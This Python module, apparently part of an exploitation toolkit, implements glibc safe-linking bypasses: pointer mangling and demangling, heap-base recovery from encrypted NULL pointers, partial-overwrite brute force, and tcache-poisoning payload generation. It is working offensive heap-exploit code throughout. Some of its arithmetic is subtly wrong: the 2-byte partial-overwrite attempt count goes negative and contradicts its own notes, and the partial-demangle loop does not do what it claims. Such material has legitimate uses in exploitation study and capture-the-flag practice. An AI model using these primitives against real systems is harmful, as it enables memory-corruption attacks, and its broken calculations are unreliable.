"""
Safe-Linking Bypass techniques for modern glibc (2.32+).

Safe-linking is a protection mechanism that encrypts forward pointers
in freed chunks using XOR with a shifted heap address.

Encryption: encrypted_ptr = actual_ptr ^ (chunk_addr >> 12)
Decryption: actual_ptr = encrypted_ptr ^ (chunk_addr >> 12)

References:
- https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/
- https://github.com/shellphish/how2heap/blob/master/glibc_2.32/
"""

from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class SafeLinkingConfig:
    """Configuration for safe-linking operations."""
    bits: int = 64
    libc_version: str = "2.35"
    heap_base: int = 0  # Known heap base if available


class SafeLinkingBypassAdvanced:
    """
    Advanced Safe-Linking bypass techniques.

    Provides multiple methods to defeat safe-linking protection:
    1. Full bypass with heap leak
    2. Partial overwrite (12-bit brute force)
    3. Heap base recovery from NULL pointers
    4. Demangle leaked pointers
    """

    def __init__(self, bits: int = 64, libc_version: str = "2.35"):
        """
        Initialize safe-linking bypass helper.

        Args:
            bits: Architecture bits (32 or 64)
            libc_version: Target glibc version
        """
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.libc_version = libc_version

        # Parse version
        self.major, self.minor = self._parse_version(libc_version)

        # Safe-linking introduced in glibc 2.32
        self.has_safe_linking = self.major > 2 or (self.major == 2 and self.minor >= 32)

        # Page size for calculations
        self.page_size = 0x1000

    def _parse_version(self, version: str) -> Tuple[int, int]:
        """Parse glibc version string."""
        try:
            parts = version.split(".")
            return int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
        except (ValueError, IndexError):
            return 2, 35

    def is_enabled(self) -> bool:
        """Check if safe-linking is enabled for this glibc version."""
        return self.has_safe_linking

    def encrypt(self, ptr: int, chunk_addr: int) -> int:
        """
        Encrypt a pointer for safe-linking.

        Args:
            ptr: Actual pointer value
            chunk_addr: Address of the chunk containing this pointer

        Returns:
            Encrypted pointer
        """
        return ptr ^ (chunk_addr >> 12)

    def decrypt(self, encrypted_ptr: int, chunk_addr: int) -> int:
        """
        Decrypt a safe-linked pointer.

        Args:
            encrypted_ptr: Encrypted pointer from heap
            chunk_addr: Address of the chunk containing this pointer

        Returns:
            Decrypted actual pointer
        """
        return encrypted_ptr ^ (chunk_addr >> 12)

    def recover_heap_base_from_null(self, encrypted_null: int) -> int:
        """
        Recover heap base from an encrypted NULL pointer.

        When the actual pointer is NULL (0), the encrypted value is:
            encrypted = 0 ^ (chunk_addr >> 12) = chunk_addr >> 12

        So: heap_base ≈ encrypted_null << 12

        Args:
            encrypted_null: Encrypted NULL pointer read from freed chunk

        Returns:
            Approximate heap base (page-aligned)
        """
        return encrypted_null << 12

    def demangle_with_partial_info(
        self,
        encrypted_ptr: int,
        known_bits: int = 12,
    ) -> List[int]:
        """
        Demangle pointer when we only know some address bits.

        The XOR key is (addr >> 12), so the low 12 bits of the address
        don't affect encryption. We can use this for partial knowledge.

        Args:
            encrypted_ptr: Encrypted pointer
            known_bits: Number of low bits we know about the address

        Returns:
            List of possible decrypted values
        """
        candidates = []

        # The key is the upper bits shifted
        # If we know some bits, we can narrow down possibilities

        # For 12-bit brute force (4096 possibilities)
        if known_bits == 12:
            for page_num in range(0x1000):  # Reasonable heap range
                potential_key = page_num
                decrypted = encrypted_ptr ^ potential_key
                # Check if result looks like valid heap pointer
                if self._looks_like_heap_ptr(decrypted):
                    candidates.append(decrypted)

        return candidates

    def _looks_like_heap_ptr(self, ptr: int) -> bool:
        """Check if pointer looks like a valid heap address."""
        if self.bits == 64:
            # Typical heap range on 64-bit
            return 0x500000000000 <= ptr <= 0x600000000000 or \
                   0x55000000000 <= ptr <= 0x56000000000
        else:
            # 32-bit heap range
            return 0x08000000 <= ptr <= 0xc0000000

    def generate_bypass_with_leak(
        self,
        target_ptr: int,
        heap_leak: int,
    ) -> Dict[str, Any]:
        """
        Generate bypass payload when we have a heap leak.

        Args:
            target_ptr: Pointer we want to write
            heap_leak: Known heap address

        Returns:
            Bypass information
        """
        if not self.has_safe_linking:
            return {
                "needed": False,
                "payload": self.pack(target_ptr),
                "notes": f"glibc {self.libc_version} has no safe-linking",
            }

        # Calculate the key from heap leak
        key = heap_leak >> 12
        encrypted = target_ptr ^ key

        return {
            "needed": True,
            "technique": "full_bypass",
            "heap_leak": heap_leak,
            "key": key,
            "target_ptr": target_ptr,
            "encrypted_ptr": encrypted,
            "payload": self.pack(encrypted),
            "steps": [
                f"1. Use heap leak: 0x{heap_leak:x}",
                f"2. Calculate key: 0x{heap_leak:x} >> 12 = 0x{key:x}",
                f"3. Encrypt target: 0x{target_ptr:x} ^ 0x{key:x} = 0x{encrypted:x}",
                "4. Write encrypted pointer to freed chunk's fd",
            ],
        }

    def generate_partial_overwrite(
        self,
        target_offset: int,
        overwrite_bytes: int = 2,
    ) -> Dict[str, Any]:
        """
        Generate partial overwrite bypass.

        Only overwrites low bytes of the pointer, avoiding the need
        to know the full heap address.

        Args:
            target_offset: Offset within the heap page
            overwrite_bytes: Number of bytes to overwrite (1-2)

        Returns:
            Bypass information
        """
        result = {
            "technique": "partial_overwrite",
            "target_offset": target_offset,
            "overwrite_bytes": overwrite_bytes,
            "brute_force_bits": 12 - (overwrite_bytes * 8),
            "steps": [
                f"1. Determine target offset within page: 0x{target_offset:x}",
                f"2. Overwrite only low {overwrite_bytes} byte(s) of fd",
                "3. Low 12 bits are not affected by encryption key",
                f"4. May need up to {2**(12 - overwrite_bytes*8)} attempts",
            ],
        }

        if overwrite_bytes == 2:
            result["notes"] = "2-byte overwrite: may need 16 attempts (4-bit brute force)"
        elif overwrite_bytes == 1:
            result["notes"] = "1-byte overwrite: may need 256 attempts (8-bit brute force)"

        return result

    def generate_null_leak_attack(self) -> Dict[str, Any]:
        """
        Generate attack using NULL pointer encryption to leak heap.

        Returns:
            Attack information
        """
        return {
            "technique": "null_pointer_leak",
            "description": "Recover heap base from encrypted NULL",
            "steps": [
                "1. Allocate and free a chunk (fd becomes NULL pointer)",
                "2. Read the encrypted fd value from freed chunk",
                "3. encrypted_null = 0 ^ (addr >> 12) = addr >> 12",
                "4. heap_base ≈ encrypted_null << 12",
            ],
            "code": """
def leak_heap_base(read_func, freed_chunk_addr):
    encrypted_null = read_func(freed_chunk_addr, 8)
    encrypted_null = u64(encrypted_null)
    heap_base = encrypted_null << 12
    return heap_base
""",
        }

    def analyze_leaked_pointer(
        self,
        leaked_value: int,
        chunk_addr: int,
    ) -> Dict[str, Any]:
        """
        Analyze a leaked encrypted pointer.

        Args:
            leaked_value: Value read from heap
            chunk_addr: Address where this value was stored

        Returns:
            Analysis results
        """
        if not self.has_safe_linking:
            return {
                "is_encrypted": False,
                "actual_ptr": leaked_value,
                "notes": "No safe-linking in this glibc version",
            }

        key = chunk_addr >> 12
        decrypted = leaked_value ^ key

        return {
            "is_encrypted": True,
            "encrypted_value": leaked_value,
            "key": key,
            "decrypted_ptr": decrypted,
            "analysis": {
                "is_null": decrypted == 0,
                "looks_like_heap": self._looks_like_heap_ptr(decrypted),
                "page_aligned": (decrypted & 0xFFF) == 0,
            },
        }

    def generate_tcache_poisoning_payload(
        self,
        target_addr: int,
        heap_base: int,
        chunk_offset: int = 0,
    ) -> bytes:
        """
        Generate tcache poisoning payload for safe-linking bypass.

        Args:
            target_addr: Address we want to allocate at
            heap_base: Known heap base address
            chunk_offset: Offset of our chunk from heap base

        Returns:
            Encrypted payload to write to freed chunk's fd
        """
        chunk_addr = heap_base + chunk_offset
        encrypted = self.encrypt(target_addr, chunk_addr)
        return self.pack(encrypted)

    def summary(self) -> str:
        """Get technique summary."""
        status = "Enabled" if self.has_safe_linking else "Not Present"

        return f"""
Safe-Linking Bypass
===================
Architecture: {self.bits}-bit
glibc version: {self.libc_version}
Safe-linking: {status}

Bypass Techniques:
1. Full bypass with heap leak
   - Requires any heap address leak
   - 100% reliable

2. Partial overwrite
   - Overwrite 1-2 low bytes only
   - May require brute force (16-256 attempts)

3. NULL pointer leak
   - Read encrypted NULL from freed chunk
   - Recover heap base

Encryption: encrypted = ptr ^ (chunk_addr >> 12)
Decryption: ptr = encrypted ^ (chunk_addr >> 12)
"""


def safe_linking_encrypt(ptr: int, chunk_addr: int) -> int:
    """Encrypt pointer for safe-linking (convenience function)."""
    return ptr ^ (chunk_addr >> 12)


def safe_linking_decrypt(encrypted: int, chunk_addr: int) -> int:
    """Decrypt safe-linked pointer (convenience function)."""
    return encrypted ^ (chunk_addr >> 12)


def recover_heap_base(encrypted_null: int) -> int:
    """Recover heap base from encrypted NULL (convenience function)."""
    return encrypted_null << 12
